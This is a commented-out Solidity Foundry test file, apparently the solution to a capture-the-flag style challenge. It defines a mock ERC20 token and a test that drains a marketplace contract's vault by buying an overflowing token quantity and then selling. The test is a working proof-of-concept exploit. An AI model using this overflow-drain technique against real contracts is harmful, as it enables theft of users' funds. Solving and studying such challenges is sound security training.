// // SPDX-License-Identifier: UNLICENSED
// pragma solidity >=0.7.0 <=0.8.21;

// import "forge-std/Test.sol";
// import "../src/marketFactory.sol";
// import "../src/MarketPlace.sol";
// import "../src/IERC20.sol";

// contract MockERC20 is IERC20 {
//     mapping(address => uint256) public override balanceOf;
//     mapping(address => mapping(address => uint256)) public override allowance;
//     uint256 public override totalSupply;

//     string public name = "MockVaultToken";

//     constructor(uint256 initialSupply) {
//         _mint(msg.sender, initialSupply);
//     }

//     function _mint(address to, uint256 amount) internal {
//         balanceOf[to] += amount;
//         totalSupply += amount;
//     }

//     function transfer(address to, uint256 value) external override returns (bool) {
//         _transfer(msg.sender, to, value);
//         return true;
//     }

//     function transferFrom(address from, address to, uint256 value) external override returns (bool) {
//         if (allowance[from][msg.sender] != type(uint256).max) {
//             require(allowance[from][msg.sender] >= value, "ERC20: insufficient allowance");
//             allowance[from][msg.sender] -= value;
//         }
//         _transfer(from, to, value);
//         return true;
//     }

//     function approve(address spender, uint256 value) external override returns (bool) {
//         allowance[msg.sender][spender] = value;
//         emit Approval(msg.sender, spender, value);
//         return true;
//     }

//     function _transfer(address from, address to, uint256 value) internal {
//         require(balanceOf[from] >= value, "ERC20: insufficient balance");
//         balanceOf[from] -= value;
//         balanceOf[to] += value;
//         emit Transfer(from, to, value);
//     }
// }

// contract MarketPlaceTest is Test {
//     MockERC20 vault;
//     MarketPlaceFactory factory;
//     MarketPlace marketplace;

//     address attacker = address(0x1);
//     uint256 constant INITIAL_VAULT_SUPPLY = 1000 * 1e18;

//     function setUp() public {
//         vault = new MockERC20(INITIAL_VAULT_SUPPLY);
//         factory = new MarketPlaceFactory(address(vault));
//     }

//     function test_DrainMarketPlace_OverflowAttack() public {
//         vm.startPrank(attacker);
//         address mpAddr = factory.register("attacker");
//         marketplace = MarketPlace(mpAddr);

//         assertEq(vault.balanceOf(mpAddr), 1e18);
       
//         uint256 numTokens = type(uint256).max / 1e18 + 1;

//         marketplace.buy(numTokens);

//         assertGt(marketplace.balanceOf(attacker), 0);
//         marketplace.sell(1);
//         assertEq(vault.balanceOf(mpAddr), 0);

//         assertTrue(marketplace.isComplete());

//         factory.Complete(mpAddr);
//         assertEq(vault.balanceOf(attacker), 1e18);

//         vm.stopPrank();
//     }
// }